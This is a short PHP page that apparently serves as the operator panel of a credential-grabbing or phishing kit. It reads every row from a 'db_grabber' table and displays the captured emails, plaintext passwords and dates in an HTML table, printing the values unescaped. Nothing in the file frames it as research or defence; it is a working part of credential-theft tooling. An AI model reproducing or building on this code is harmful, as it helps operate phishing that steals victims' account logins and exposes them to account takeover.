<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="hero">
        <div class="wrapper">
        <table class="tbl-full">
            <tr>
                <th>S.N</th>
                <th>Email</th>
                <th>Password</th>
                <th>date</th>
                
            </tr>

            <?php
            require_once 'config.php';
                 $sql = "SELECT * from db_grabber"; 
                 $res = mysqli_query($conn, $sql);

                 if($res==TRUE){
                    $count = mysqli_num_rows($res);

                    $sn=1;
                    if($count>0){
                        while($rows=mysqli_fetch_assoc($res))
                        {
                            $id=$rows["id"];
                            $email=$rows["demail"];
                            $password=$rows["dpassword"];
                            $ddate=$rows['dedate'];

                            ?>

                        <tr>
                            <td><?php echo $sn++; ?></td>
                            <td><?php echo $email; ?></td>
                            <td><?php echo $password; ?></td>
                            <td><?php echo $ddate; ?></td>
                            <!-- <td>
                    
                                <a class="btn-secondary">Update Admin</a>
                                <a href="" class="btn-danger">Delete Admin</a>
                            </td> -->
                        </tr>
                            <?php

                        }


                    }else {
                        # code...
                    }
                 }
            ?>
            
           </table>
        </div>
    </div>
</body>
</html>